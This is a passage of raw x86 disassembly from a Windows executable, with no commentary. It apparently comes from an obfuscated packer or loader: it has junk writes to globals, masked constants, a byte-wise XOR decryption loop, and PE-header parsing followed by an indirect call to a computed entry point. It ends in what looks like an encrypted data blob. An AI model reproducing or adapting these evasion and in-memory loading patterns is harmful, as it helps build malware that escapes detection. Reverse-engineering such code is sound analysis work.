  401e0d:	and    eax,DWORD PTR [eax+ecx*1]
  401e10:	mov    eax,DWORD PTR [ebp-0x8]
  401e13:	mov    ecx,DWORD PTR [ebp-0x48]
  401e16:	xor    eax,esi
  401e18:	or     DWORD PTR ds:0x42f000,0x42e00c
  401e22:	add    eax,edi
  401e24:	mov    DWORD PTR ds:0x431010,0x752e
  401e2e:	cmp    eax,ecx
  401e30:	mov    DWORD PTR ds:0x42e028,0x5f39
  401e3a:	je     0x40206b
  401e40:	and    DWORD PTR ds:0x432018,0x431008
  401e4a:	push   0x4345fb
  401e4f:	xor    esi,esi
  401e51:	adc    DWORD PTR ds:0x431008,0x430008
  401e5b:	inc    esi
  401e5c:	push   esi
  401e5d:	push   esi
  401e5e:	call   DWORD PTR ds:0x4348f7
  401e64:	adc    DWORD PTR ds:0x432018,0x1eff
  401e6e:	test   eax,eax
  401e70:	jne    0x40257b
  401e76:	adc    DWORD PTR ds:0x42f004,0x6493
  401e80:	push   0x9
  401e82:	push   0x434613
  401e87:	sub    DWORD PTR ds:0x432010,0x1cce
  401e91:	call   DWORD PTR ds:0x4348ef
  401e97:	and    DWORD PTR ds:0x42e020,0x42e000
  401ea1:	test   eax,eax
  401ea3:	mov    DWORD PTR ds:0x43000c,0x3dc5
  401ead:	jne    0x402557
  401eb3:	push   0x43462f
  401eb8:	or     DWORD PTR ds:0x43201c,0x7d24
  401ec2:	push   esi
  401ec3:	push   esi
  401ec4:	add    DWORD PTR ds:0x43101c,0x2a6c
  401ece:	call   DWORD PTR ds:0x43490b
  401ed4:	or     DWORD PTR ds:0x431008,0x42e01c
  401ede:	test   eax,eax
  401ee0:	mov    DWORD PTR ds:0x430014,0x29eb
  401eea:	jne    0x402557
  401ef0:	add    DWORD PTR ds:0x432014,0x430014
  401efa:	push   0xd
  401efc:	push   0x43463f
  401f01:	neg    DWORD PTR ds:0x43000c
  401f07:	call   DWORD PTR ds:0x43490f
  401f0d:	adc    DWORD PTR ds:0x43100c,0x4142
  401f17:	test   eax,eax
  401f19:	mov    DWORD PTR ds:0x43001c,0x44ef
  401f23:	jne    0x40257b
  401f29:	and    DWORD PTR ds:0x42e000,0x0
  401f33:	jmp    0x401f43
  401f38:	mov    eax,ds:0x42e000
  401f3d:	inc    eax
  401f3e:	mov    ds:0x42e000,eax
  401f43:	cmp    DWORD PTR ds:0x42e000,0x1e
  401f4a:	jae    0x401f92
  401f50:	cmp    DWORD PTR ds:0x42e000,0x12
  401f57:	jle    0x401f92
  401f5d:	jmp    0x401f75
  401f62:	push   DWORD PTR [ebp-0x10]
  401f65:	push   0x432004
  401f6a:	push   0x434000
  401f6f:	call   DWORD PTR ds:0x4348fb
  401f75:	cmp    DWORD PTR ds:0x42e000,0x11
  401f7c:	jne    0x401f8d
  401f82:	mov    eax,ds:0x42e000
  401f87:	inc    eax
  401f88:	mov    ds:0x42e000,eax
  401f8d:	jmp    0x401f38
  401f92:	mov    eax,ds:0x4342d7
  401f97:	and    DWORD PTR ds:0x432004,ecx
  401f9d:	mov    eax,DWORD PTR [eax+0x194]
  401fa3:	xor    DWORD PTR ds:0x432010,0x2285
  401fad:	mov    ecx,DWORD PTR [eax]
  401faf:	mov    eax,DWORD PTR [ecx+0x3c]
  401fb2:	push   DWORD PTR ds:0x4343af
  401fb8:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401fbc:	push   DWORD PTR ds:0x43415b
  401fc2:	sub    DWORD PTR ds:0x432018,0x4072
  401fcc:	add    eax,ecx
  401fce:	and    DWORD PTR ds:0x42f008,0x0
  401fd8:	jmp    0x401fea
  401fdd:	mov    ecx,DWORD PTR ds:0x42f008
  401fe3:	inc    ecx
  401fe4:	mov    DWORD PTR ds:0x42f008,ecx
  401fea:	cmp    DWORD PTR ds:0x42f008,0x1e
  401ff1:	jae    0x402048
  401ff7:	cmp    DWORD PTR ds:0x42f008,0x4
  401ffe:	jge    0x402048
  402004:	jmp    0x402029
  402009:	push   0x1e10
  40200e:	push   0x4340a5
  402013:	push   0x6e6c
  402018:	push   0x4340d1
  40201d:	push   DWORD PTR [ebp-0x18]
  402020:	push   DWORD PTR [ebp-0x28]
  402023:	call   DWORD PTR ds:0x4348ff
  402029:	cmp    DWORD PTR ds:0x42f008,0x3
  402030:	jne    0x402043
  402036:	mov    ecx,DWORD PTR ds:0x42f008
  40203c:	inc    ecx
  40203d:	mov    DWORD PTR ds:0x42f008,ecx
  402043:	jmp    0x401fdd
  402048:	mov    ecx,DWORD PTR ds:0x4342d7
  40204e:	mov    ecx,DWORD PTR [ecx+0x194]
  402054:	push   DWORD PTR [ecx]
  402056:	call   eax
  402058:	mov    ecx,DWORD PTR ds:0x4342d7
  40205e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  402064:	mov    DWORD PTR [ecx],eax
  402066:	jmp    0x4026ad
  40206b:	push   0x4344f3
  402070:	xor    ebx,ebx
  402072:	inc    ebx
  402073:	push   ebx
  402074:	push   ebx
  402075:	call   DWORD PTR ds:0x4348f7
  40207b:	test   eax,eax
  40207d:	jne    0x40257b
  402083:	push   0x9
  402085:	push   0x43450b
  40208a:	call   DWORD PTR ds:0x4348ef
  402090:	test   eax,eax
  402092:	jne    0x402557
  402098:	push   0x434527
  40209d:	push   ebx
  40209e:	push   ebx
  40209f:	call   DWORD PTR ds:0x43490b
  4020a5:	test   eax,eax
  4020a7:	jne    0x402557
  4020ad:	push   0xd
  4020af:	push   0x434537
  4020b4:	call   DWORD PTR ds:0x43490f
  4020ba:	test   eax,eax
  4020bc:	jne    0x40257b
  4020c2:	push   0x43454b
  4020c7:	push   ebx
  4020c8:	push   ebx
  4020c9:	call   DWORD PTR ds:0x4348f7
  4020cf:	test   eax,eax
  4020d1:	jne    0x40257b
  4020d7:	push   0x9
  4020d9:	push   0x434563
  4020de:	call   DWORD PTR ds:0x4348ef
  4020e4:	test   eax,eax
  4020e6:	jne    0x402557
  4020ec:	push   0x43457f
  4020f1:	push   ebx
  4020f2:	push   ebx
  4020f3:	call   DWORD PTR ds:0x43490b
  4020f9:	test   eax,eax
  4020fb:	jne    0x402557
  402101:	push   0xd
  402103:	push   0x43458f
  402108:	call   DWORD PTR ds:0x43490f
  40210e:	test   eax,eax
  402110:	jne    0x40257b
  402116:	mov    eax,DWORD PTR [ebp-0x8]
  402119:	mov    ecx,DWORD PTR [ebp-0x7c]
  40211c:	xor    eax,esi
  40211e:	add    eax,edi
  402120:	cmp    eax,ecx
  402122:	jne    0x4024fe
  402128:	mov    eax,DWORD PTR [ebp-0x8]
  40212b:	mov    ecx,DWORD PTR ds:0x4342d7
  402131:	mov    ecx,DWORD PTR [ecx+0x198]
  402137:	xor    eax,esi
  402139:	add    eax,edi
  40213b:	cmp    eax,DWORD PTR [ecx]
  40213d:	jne    0x402160
  402143:	mov    eax,DWORD PTR [ebp-0x8]
  402146:	push   0xf89c8581
  40214b:	xor    eax,esi
  40214d:	add    eax,edi
  40214f:	push   eax
  402150:	push   0xf89c85bd
  402155:	push   DWORD PTR [ebp-0xc]
  402158:	push   DWORD PTR [ebp-0x8]
  40215b:	call   0x40e5e8
  402160:	mov    eax,DWORD PTR [ebp-0xc]
  402163:	mov    DWORD PTR [ebp-0x4c],eax
  402166:	mov    eax,DWORD PTR [ebp-0x8]
  402169:	mov    DWORD PTR [ebp-0x60],eax
  40216c:	mov    eax,DWORD PTR [ebp-0x60]
  40216f:	xor    eax,esi
  402171:	add    eax,edi
  402173:	mov    DWORD PTR [ebp+0x10],eax
  402176:	mov    eax,ds:0x434157
  40217b:	mov    eax,DWORD PTR [eax]
  40217d:	mov    DWORD PTR [ebp+0x10],eax
  402180:	mov    eax,ds:0x43435f
  402185:	mov    eax,DWORD PTR [eax]
  402187:	mov    DWORD PTR [ebp-0x18],eax
  40218a:	mov    DWORD PTR [ebp+0xc],0xf89c8781
  402191:	mov    eax,DWORD PTR [ebp+0xc]
  402194:	xor    eax,esi
  402196:	add    eax,edi
  402198:	mov    DWORD PTR [ebp+0xc],eax
  40219b:	mov    eax,ds:0x4342d7
  4021a0:	mov    DWORD PTR [ebp+0xc],eax
  4021a3:	mov    eax,DWORD PTR [ebp+0x10]
  4021a6:	mov    DWORD PTR [ebp+0xc],eax
  4021a9:	mov    eax,DWORD PTR [ebp+0xc]
  4021ac:	push   0x4
  4021ae:	pop    ecx
  4021af:	sub    ecx,eax
  4021b1:	add    ecx,DWORD PTR [ebp-0x18]
  4021b4:	mov    DWORD PTR [ebp-0x38],0xf89c85c1
  4021bb:	mov    DWORD PTR [ebp+0x10],ecx
  4021be:	mov    DWORD PTR [ebp-0x108],0xf89c85bd
  4021c8:	mov    eax,DWORD PTR [ebp+0xc]
  4021cb:	mov    DWORD PTR [ebp-0x104],eax
  4021d1:	mov    eax,DWORD PTR [ebp+0x10]
  4021d4:	mov    DWORD PTR [ebp-0x100],eax
  4021da:	mov    eax,DWORD PTR [ebp-0x38]
  4021dd:	xor    eax,esi
  4021df:	add    eax,edi
  4021e1:	mov    DWORD PTR [ebp-0xfc],eax
  4021e7:	lea    eax,[ebp-0x98]
  4021ed:	mov    DWORD PTR [ebp-0xf8],eax
  4021f3:	mov    eax,DWORD PTR [ebp-0x108]
  4021f9:	xor    eax,esi
  4021fb:	add    eax,edi
  4021fd:	mov    DWORD PTR [ebp-0x108],eax
  402203:	lea    eax,[ebp-0x108]
  402209:	push   eax
  40220a:	mov    eax,DWORD PTR [ebp-0x4c]
  40220d:	xor    eax,esi
  40220f:	add    eax,edi
  402211:	push   eax
  402212:	mov    eax,ds:0x4342f7
  402217:	push   0x43424d
  40221c:	push   DWORD PTR [eax]
  40221e:	call   0x409457
  402223:	mov    eax,DWORD PTR [ebp+0xc]
  402226:	mov    ecx,DWORD PTR [ebp+0x10]
  402229:	mov    DWORD PTR [ebp-0x84],ecx
  40222f:	mov    ecx,DWORD PTR [ebp-0x60]
  402232:	xor    ecx,esi
  402234:	mov    DWORD PTR [ebp-0x18],eax
  402237:	add    ecx,edi
  402239:	jmp    0x40249c
  40223e:	lea    edx,[ecx+eax*1]
  402241:	mov    DWORD PTR [ebp+0x10],edx
  402244:	mov    edx,DWORD PTR [ebp-0x84]
  40224a:	sub    edx,ecx
  40224c:	mov    DWORD PTR [ebp+0xc],edx
  40224f:	mov    edx,DWORD PTR [ebp+0xc]
  402252:	mov    DWORD PTR [ebp-0x54],edx
  402255:	mov    edx,DWORD PTR [ebp+0x10]
  402258:	mov    DWORD PTR [ebp-0x50],0xf89c8581
  40225f:	mov    DWORD PTR [ebp-0x6c],edx
  402262:	mov    DWORD PTR [ebp-0x24],0xf89c8580
  402269:	mov    edx,DWORD PTR [ebp-0x50]
  40226c:	xor    edx,esi
  40226e:	add    edx,edi
  402270:	mov    DWORD PTR [ebp+0x10],edx
  402273:	mov    edx,DWORD PTR [ebp-0x50]
  402276:	xor    edx,esi
  402278:	add    edx,edi
  40227a:	mov    DWORD PTR [ebp+0xc],edx
  40227d:	mov    DWORD PTR [ebp-0x68],0xf89c85a1
  402284:	mov    DWORD PTR [ebp-0x74],0xf89c85be
  40228b:	mov    edx,DWORD PTR [ebp-0x50]
  40228e:	mov    ebx,DWORD PTR [ebp-0x54]
  402291:	xor    edx,esi
  402293:	add    edx,edi
  402295:	cmp    ebx,edx
  402297:	je     0x402490
  40229d:	mov    eax,DWORD PTR [ebp-0x24]
  4022a0:	xor    eax,esi
  4022a2:	mov    edx,0xffcd8d1c
  4022a7:	sub    edx,eax
  4022a9:	add    edx,DWORD PTR [ebp-0x54]
  4022ac:	mov    eax,DWORD PTR [ebp-0x24]
  4022af:	mov    ebx,DWORD PTR [ebp+0x10]
  4022b2:	xor    eax,esi
  4022b4:	add    eax,edi
  4022b6:	imul   eax,ebx
  4022b9:	cmp    eax,edx
  4022bb:	ja     0x40248d
  4022c1:	mov    edx,DWORD PTR [ebp+0x10]
  4022c4:	mov    eax,DWORD PTR [ebp-0x54]
  4022c7:	mov    ebx,DWORD PTR [ebp-0x68]
  4022ca:	sub    eax,edx
  4022cc:	xor    ebx,esi
  4022ce:	xor    edx,edx
  4022d0:	add    ebx,edi
  4022d2:	div    ebx
  4022d4:	mov    DWORD PTR [ebp+0xc],eax
  4022d7:	mov    eax,DWORD PTR [ebp-0x74]
  4022da:	mov    edx,DWORD PTR [ebp+0xc]
  4022dd:	xor    eax,esi
  4022df:	add    eax,edi
  4022e1:	cmp    edx,eax
  4022e3:	jbe    0x4022f3
  4022e9:	mov    eax,DWORD PTR [ebp-0x74]
  4022ec:	xor    eax,esi
  4022ee:	add    eax,edi
  4022f0:	mov    DWORD PTR [ebp+0xc],eax
  4022f3:	mov    eax,DWORD PTR [ebp-0x68]
  4022f6:	mov    edx,DWORD PTR [ebp+0xc]
  4022f9:	xor    eax,esi
  4022fb:	add    eax,edi
  4022fd:	imul   eax,edx
  402300:	mov    DWORD PTR [ebp+0xc],eax
  402303:	mov    eax,DWORD PTR [ebp-0x50]
  402306:	mov    edx,DWORD PTR [ebp+0xc]
  402309:	xor    eax,esi
  40230b:	add    eax,edi
  40230d:	cmp    edx,eax
  40230f:	je     0x402476
  402315:	mov    eax,DWORD PTR [ebp+0xc]
  402318:	mov    DWORD PTR [ebp-0x3c],eax
  40231b:	mov    eax,DWORD PTR [ebp+0x10]
  40231e:	add    eax,DWORD PTR [ebp-0x6c]
  402321:	mov    DWORD PTR [ebp-0x38],0xf89c8581
  402328:	mov    DWORD PTR [ebp-0x30],eax
  40232b:	mov    eax,0xf89c8580
  402330:	mov    DWORD PTR [ebp-0x64],eax
  402333:	mov    DWORD PTR [ebp-0x58],0xf89c8583
  40233a:	mov    DWORD PTR [ebp-0x10],0xf89c8582
  402341:	mov    DWORD PTR [ebp-0x2c],eax
  402344:	mov    eax,DWORD PTR [ebp-0x38]
  402347:	xor    eax,esi
  402349:	add    eax,edi
  40234b:	jmp    0x402432
  402350:	mov    DWORD PTR [ebp-0x78],0xf89c85bb
  402357:	mov    DWORD PTR [ebp-0x80],0xf89c85ad
  40235e:	mov    eax,DWORD PTR [ebp-0x2c]
  402361:	mov    edx,DWORD PTR [ebp+0xc]
  402364:	xor    eax,esi
  402366:	add    eax,edi
  402368:	imul   eax,edx
  40236b:	mov    edx,DWORD PTR [ebp-0x30]
  40236e:	mov    al,BYTE PTR [eax+edx*1]
  402371:	mov    BYTE PTR [ebp-0x1],al
  402374:	mov    eax,DWORD PTR [ebp-0x2c]
  402377:	mov    edx,DWORD PTR [ebp+0xc]
  40237a:	xor    eax,esi
  40237c:	add    eax,edi
  40237e:	imul   eax,edx
  402381:	mov    edx,DWORD PTR [ebp-0x58]
  402384:	xor    edx,esi
  402386:	add    eax,edx
  402388:	mov    edx,DWORD PTR [ebp-0x30]
  40238b:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e4]
  402393:	mov    edx,DWORD PTR [ebp-0x78]
  402396:	xor    edx,esi
  402398:	lea    eax,[edx+eax*1+0x3272e4]
  40239f:	movzx  edx,BYTE PTR [ebp-0x1]
  4023a3:	xor    edx,eax
  4023a5:	mov    BYTE PTR [ebp-0x1],dl
  4023a8:	mov    al,BYTE PTR [ebp-0x1]
  4023ab:	mov    edx,DWORD PTR [ebp-0x2c]
  4023ae:	mov    ebx,DWORD PTR [ebp+0xc]
  4023b1:	xor    edx,esi
  4023b3:	add    edx,edi
  4023b5:	imul   edx,ebx
  4023b8:	mov    ebx,DWORD PTR [ebp-0x30]
  4023bb:	mov    BYTE PTR [edx+ebx*1],al
  4023be:	mov    eax,DWORD PTR [ebp-0x2c]
  4023c1:	mov    edx,DWORD PTR [ebp+0xc]
  4023c4:	xor    eax,esi
  4023c6:	add    eax,edi
  4023c8:	imul   eax,edx
  4023cb:	mov    edx,DWORD PTR [ebp-0x30]
  4023ce:	mov    al,BYTE PTR [eax+edx*1]
  4023d1:	mov    BYTE PTR [ebp-0x1],al
  4023d4:	mov    eax,DWORD PTR [ebp-0x2c]
  4023d7:	mov    edx,DWORD PTR [ebp+0xc]
  4023da:	xor    eax,esi
  4023dc:	add    eax,edi
  4023de:	imul   eax,edx
  4023e1:	mov    edx,DWORD PTR [ebp-0x64]
  4023e4:	xor    edx,esi
  4023e6:	add    eax,edx
  4023e8:	mov    edx,DWORD PTR [ebp-0x30]
  4023eb:	movzx  eax,BYTE PTR [eax+edx*1+0x3272e4]
  4023f3:	mov    edx,DWORD PTR [ebp-0x80]
  4023f6:	xor    edx,esi
  4023f8:	lea    eax,[edx+eax*1+0x3272e4]
  4023ff:	movzx  edx,BYTE PTR [ebp-0x1]
  402403:	xor    edx,eax
  402405:	mov    BYTE PTR [ebp-0x1],dl
  402408:	mov    al,BYTE PTR [ebp-0x1]
  40240b:	mov    edx,DWORD PTR [ebp-0x2c]
  40240e:	mov    ebx,DWORD PTR [ebp+0xc]
  402411:	xor    edx,esi
  402413:	add    edx,edi
  402415:	imul   edx,ebx
  402418:	mov    ebx,DWORD PTR [ebp-0x30]
  40241b:	mov    BYTE PTR [edx+ebx*1],al
  40241e:	mov    eax,DWORD PTR [ebp-0x10]
  402421:	mov    edx,DWORD PTR [ebp-0x64]
  402424:	xor    eax,esi
  402426:	xor    edx,esi
  402428:	add    eax,edi
  40242a:	add    edx,edi
  40242c:	imul   eax,edx
  40242f:	add    eax,DWORD PTR [ebp+0xc]
  402432:	mov    DWORD PTR [ebp+0xc],eax
  402435:	mov    eax,DWORD PTR [ebp+0xc]
  402438:	mov    edx,DWORD PTR [ebp-0x3c]
  40243b:	cmp    edx,eax
  40243d:	jb     0x402350
  402443:	mov    eax,DWORD PTR [ebp-0x64]
  402446:	mov    edx,DWORD PTR [ebp-0x3c]
  402449:	xor    eax,esi
  40244b:	add    eax,edi
  40244d:	imul   eax,edx
  402450:	mov    edx,DWORD PTR [ebp-0x38]
  402453:	xor    edx,esi
  402455:	add    edx,edi
  402457:	or     eax,edx
  402459:	mov    edx,DWORD PTR [ebp-0x24]
  40245c:	xor    edx,esi
  40245e:	add    eax,edx
  402460:	mov    edx,DWORD PTR [ebp-0x24]
  402463:	xor    edx,esi
  402465:	add    eax,edx
  402467:	mov    edx,DWORD PTR [ebp+0x10]
  40246a:	lea    eax,[eax+edx*1+0x64e5c8]
  402471:	jmp    0x402485
  402476:	mov    eax,DWORD PTR [ebp-0x24]
  402479:	mov    edx,DWORD PTR [ebp+0x10]
  40247c:	xor    eax,esi
  40247e:	lea    eax,[eax+edx*1+0x3272e4]
  402485:	mov    DWORD PTR [ebp+0x10],eax
  402488:	jmp    0x40229d
  40248d:	mov    eax,DWORD PTR [ebp-0x18]
  402490:	mov    edx,DWORD PTR [ebp-0x4c]
  402493:	xor    edx,esi
  402495:	lea    ecx,[ecx+edx*1+0x3272e4]
  40249c:	lea    edx,[ecx-0x3272e4]
  4024a2:	xor    edx,esi
  4024a4:	cmp    edx,0xf89c9581
  4024aa:	jne    0x40223e
  4024b0:	mov    ecx,DWORD PTR [ebp-0x60]
  4024b3:	mov    edx,DWORD PTR [ebp-0x4c]
  4024b6:	mov    ebx,DWORD PTR [ebp-0x60]
  4024b9:	xor    edx,esi
  4024bb:	mov    dl,BYTE PTR [edx+eax*1+0x3272e4]
  4024c2:	xor    ecx,esi
  4024c4:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e4]
  4024cb:	xor    ebx,esi
  4024cd:	mov    BYTE PTR [ebx+eax*1+0x3272e4],dl
  4024d4:	mov    edx,DWORD PTR [ebp-0x4c]
  4024d7:	xor    edx,esi
  4024d9:	mov    BYTE PTR [edx+eax*1+0x3272e4],cl
  4024e0:	mov    eax,DWORD PTR [ebp-0x4c]
  4024e3:	mov    eax,DWORD PTR [ebp-0x8]
  4024e6:	xor    eax,esi
  4024e8:	add    eax,edi
  4024ea:	mov    ds:0x43435b,eax
  4024ef:	mov    eax,DWORD PTR [ebp-0x8]
  4024f2:	xor    eax,esi
  4024f4:	add    eax,edi
  4024f6:	xor    ebx,ebx
  4024f8:	mov    ds:0x434353,eax
  4024fd:	inc    ebx
  4024fe:	lea    eax,[ebp-0x40]
  402501:	mov    DWORD PTR [ebp-0x88],eax
  402507:	lea    eax,[ebp+0x4]
  40250a:	mov    DWORD PTR [ebp-0x40],eax
  40250d:	mov    eax,DWORD PTR [ebp-0x40]
  402510:	test   eax,eax
  402512:	je     0x4026ad
  402518:	push   0x4345a3
  40251d:	push   ebx
  40251e:	push   ebx
  40251f:	call   DWORD PTR ds:0x4348f7
  402525:	test   eax,eax
  402527:	jne    0x40257b
  40252d:	push   0x9
  40252f:	push   0x4345bb
  402534:	call   DWORD PTR ds:0x4348ef
  40253a:	test   eax,eax
  40253c:	jne    0x402557
  402542:	push   0x4345d7
  402547:	push   ebx
  402548:	push   ebx
  402549:	call   DWORD PTR ds:0x43490b
  40254f:	test   eax,eax
  402551:	je     0x402566
  402557:	lea    eax,[ebp-0x20]
  40255a:	push   eax
  40255b:	call   DWORD PTR ds:0x4348af
  402561:	jmp    0x4026c8
  402566:	push   0xd
  402568:	push   0x4345e7
  40256d:	call   DWORD PTR ds:0x43490f
  402573:	test   eax,eax
  402575:	je     0x402582
  40257b:	xor    eax,eax
  40257d:	jmp    0x4026c8
  402582:	mov    DWORD PTR [ebp-0x94],0xf152c38
  40258c:	mov    DWORD PTR [ebp-0xa0],0x712ed0f
  402596:	mov    DWORD PTR [ebp-0x8c],0x373fc29
  4025a0:	mov    DWORD PTR [ebp-0x90],0x72670a19
  4025aa:	call   0x40e282
  4025af:	mov    eax,DWORD PTR [ebp-0x28]
  4025b2:	mov    eax,DWORD PTR [ebp-0xc]
  4025b5:	mov    eax,DWORD PTR [ebp-0x8]
  4025b8:	mov    DWORD PTR [ebp+0xc],eax
  4025bb:	mov    eax,eax
  4025bd:	mov    eax,ds:0x4342d7
  4025c2:	mov    eax,DWORD PTR [eax+0x1c8]
  4025c8:	mov    eax,DWORD PTR [eax]
  4025ca:	cdq    
  4025cb:	mov    ebx,eax
  4025cd:	mov    eax,0xfabdbee5
  4025d2:	add    ebx,eax
  4025d4:	adc    edx,0xffffffff
  4025d7:	and    DWORD PTR [ebp-0x10],0x0
  4025db:	xor    edx,0x0
  4025de:	mov    DWORD PTR [ebp-0x6c],edx
  4025e1:	mov    edx,DWORD PTR [ebp+0xc]
  4025e4:	mov    DWORD PTR [ebp-0x14],edx
  4025e7:	mov    ecx,0x8a29a12f
  4025ec:	xor    ebx,ecx
  4025ee:	add    DWORD PTR [ebp-0x14],eax
  4025f1:	mov    edx,DWORD PTR [ebp-0x14]
  4025f4:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4025f8:	xor    edx,ecx
  4025fa:	mov    DWORD PTR [ebp-0x5c],edx
  4025fd:	mov    edx,DWORD PTR [ebp-0x10]
  402600:	xor    edx,0x0
  402603:	mov    DWORD PTR [ebp-0x58],edx
  402606:	cmp    DWORD PTR [ebp-0x5c],ebx
  402609:	jne    0x40261b
  40260f:	mov    edx,DWORD PTR [ebp-0x6c]
  402612:	cmp    DWORD PTR [ebp-0x58],edx
  402615:	je     0x40264a
  40261b:	mov    edx,DWORD PTR ds:0x4342d7
  402621:	mov    edx,DWORD PTR [edx+0x1c0]
  402627:	mov    edx,DWORD PTR [edx]
  402629:	xor    ebx,ebx
  40262b:	add    edx,eax
  40262d:	adc    ebx,0xffffffff
  402630:	xor    edx,ecx
  402632:	xor    ebx,0x0
  402635:	cmp    edx,0x70941fc9
  40263b:	jne    0x4026ad
  402641:	cmp    ebx,0xffffffff
  402644:	jne    0x4026ad
  40264a:	mov    edx,DWORD PTR ds:0x434353
  402650:	mov    ebx,DWORD PTR ds:0x43435b
  402656:	xor    edx,ebx
  402658:	mov    DWORD PTR ds:0x434353,edx
  40265e:	mov    edx,DWORD PTR [ebp-0x40]
  402661:	mov    ebx,DWORD PTR ds:0x434353
  402667:	add    ebx,DWORD PTR [edx]
  402669:	mov    edx,DWORD PTR [ebp-0x40]
  40266c:	mov    DWORD PTR [edx],ebx
  40266e:	mov    edx,DWORD PTR [ebp+0xc]
  402671:	xor    esi,edx
  402673:	mov    edx,DWORD PTR ds:0x434353
  402679:	add    esi,edi
  40267b:	xor    ebx,ebx
  40267d:	add    esi,eax
  40267f:	adc    ebx,0xffffffff
  402682:	xor    edi,edi
  402684:	xor    esi,ecx
  402686:	xor    ebx,0x0
  402689:	add    edx,eax
  40268b:	adc    edi,0xffffffff
  40268e:	xor    edx,ecx
  402690:	xor    edi,0x0
  402693:	cmp    edx,esi
  402695:	jne    0x4026ad
  40269b:	cmp    edi,ebx
  40269d:	jne    0x4026ad
  4026a3:	mov    eax,ds:0x434353
  4026a8:	mov    ds:0x43435b,eax
  4026ad:	mov    eax,ds:0x4342d7
  4026b2:	push   0x4
  4026b4:	add    eax,0x1cc
  4026b9:	push   eax
  4026ba:	lea    eax,[ebp-0x28]
  4026bd:	push   eax
  4026be:	call   0x4026dd
  4026c3:	mov    eax,DWORD PTR [ebp-0x28]
  4026c6:	mov    eax,DWORD PTR [eax]
  4026c8:	pop    ebx
  4026c9:	pop    edi
  4026ca:	pop    esi
  4026cb:	leave  
  4026cc:	ret    0xc
  4026cf:	xor    eax,eax
  4026d1:	or     DWORD PTR ds:0x42e008,0x42e014
  4026db:	inc    eax
  4026dc:	ret    
  4026dd:	push   ebp
  4026de:	mov    ebp,esp
  4026e0:	sub    esp,0x10
  4026e3:	and    DWORD PTR ds:0x42e00c,0x0
  4026ed:	mov    ecx,DWORD PTR ds:0x42e00c
  4026f3:	inc    ecx
  4026f4:	mov    DWORD PTR ds:0x42e00c,ecx
  4026fa:	cmp    DWORD PTR ds:0x42e00c,0x1c
  402701:	jle    0x402724
  402707:	jmp    0x402717
  40270c:	push   0x2587
  402711:	call   DWORD PTR ds:0x434903
  402717:	cmp    DWORD PTR ds:0x42e00c,0x12
  40271e:	jb     0x4026ed
  402724:	mov    eax,0xf89c8581
  402729:	mov    DWORD PTR [ebp-0x4],eax
  40272c:	mov    DWORD PTR [ebp-0x8],0xf89c8580
  402733:	mov    ecx,DWORD PTR [ebp-0x4]
  402736:	or     DWORD PTR ds:0x432018,edi
  40273c:	push   esi
  40273d:	or     esi,DWORD PTR ds:0x432010
  402743:	mov    edx,0x751089d
  402748:	not    DWORD PTR ds:0x42f008
  40274e:	xor    ecx,edx
  402750:	mov    esi,0x3272e4
  402755:	push   edi
  402756:	add    DWORD PTR ds:0x42f014,0x430018
  402760:	mov    edi,DWORD PTR [ebp+0x10]
  402763:	adc    DWORD PTR ds:0x43201c,0x42f01c
  40276d:	add    ecx,esi
  40276f:	cmp    ecx,edi
  402771:	je     0x40700e
  402777:	mov    DWORD PTR ds:0x430010,0x10
  402781:	cmp    DWORD PTR ds:0x430010,0x0
  402788:	je     0x4027da
  40278e:	cmp    DWORD PTR ds:0x430010,0x6
  402795:	jge    0x4027da
  40279b:	jmp    0x4027ae
  4027a0:	push   0x66cf
  4027a5:	push   DWORD PTR [ebp-0xc]
  4027a8:	call   DWORD PTR ds:0x4348df
  4027ae:	cmp    DWORD PTR ds:0x430010,0x7
  4027b5:	jne    0x4027c8
  4027bb:	mov    ecx,DWORD PTR ds:0x430010
  4027c1:	dec    ecx
  4027c2:	mov    DWORD PTR ds:0x430010,ecx
  4027c8:	mov    ecx,DWORD PTR ds:0x430010
  4027ce:	dec    ecx
  4027cf:	mov    DWORD PTR ds:0x430010,ecx
  4027d5:	jmp    0x402781
  4027da:	mov    ecx,DWORD PTR [ebp-0x4]
  4027dd:	mov    edi,DWORD PTR [ebp+0x10]
  4027e0:	xor    eax,eax
  4027e2:	or     DWORD PTR ds:0x431004,0x8da
  4027ec:	xor    ecx,edx
  4027ee:	sub    DWORD PTR ds:0x431000,0x3add
  4027f8:	add    ecx,esi
  4027fa:	add    edi,0xfabdbee5
  402800:	jmp    0x404b88
  402805:	lahf   
  402806:	es xor al,0x90
  402809:	mov    bl,0x70
  40280b:	fwait
  40280c:	icebp  
  40280d:	sub    ecx,DWORD PTR [esi]
  40280f:	adc    ebp,DWORD PTR [esi+0x46]
  402812:	je     0x402813
  402814:	dec    ebp
  402815:	jb     0x402889
  402817:	jb     0x40288b
  402819:	pop    es
  40281a:	pop    edi
  40281b:	jb     0x40288f
  40281d:	adc    eax,0x1139172c
  402822:	and    eax,0x36652f13
  402827:	popa   
  402828:	mov    bx,0x6278
  40282c:	bound  ebp,QWORD PTR [ebp+0x4a]
  40282f:	(bad)
  402832:	push   0x53796340
  402837:	test   al,0x78
  402839:	ins    DWORD PTR es:[edi],dx
  40283a:	push   ecx
  40283b:	iret   
  40283c:	pop    ebp
  40283d:	inc    edx
  40283e:	cmp    BYTE PTR [edx+esi*8+0x4d577687],cl
  402845:	jg     0x40287e
  402847:	mov    BYTE PTR [esi+0x33bab87f],ah
  40284d:	sub    al,0xff
  40284f:	data16 fdivr st(2),st
  402852:	imul   edi,DWORD PTR [edi+0x1e],0xffffffed
  402856:	xor    ebp,ecx
  402858:	mov    dl,0xed
  40285a:	xchg   DWORD PTR [ebx],ebp
  40285c:	fiadd  WORD PTR [ebx-0x5caef0df]
  402862:	add    ah,0xf7
  402865:	ins    DWORD PTR es:[edi],dx
  402866:	fld    QWORD PTR [esp+edx*8]
  402869:	push   cs
  40286a:	repnz adc BYTE PTR es:[eax+0xc],al
  40286f:	arpl   WORD PTR es:[eax-0x4f],sp
  402873:	scas   eax,DWORD PTR es:[edi]
  402874:	sub    ebx,DWORD PTR [ecx+0x5]
  402877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402878:	jmp    ecx
  40287a:	inc    ecx
  40287b:	and    esi,DWORD PTR [edx+ecx*2-0x40]
  40287f:	push   ebx
  402880:	icebp  
  402881:	adc    dh,dl
  402883:	jo     0x40283e
  402885:	jnp    0x402864
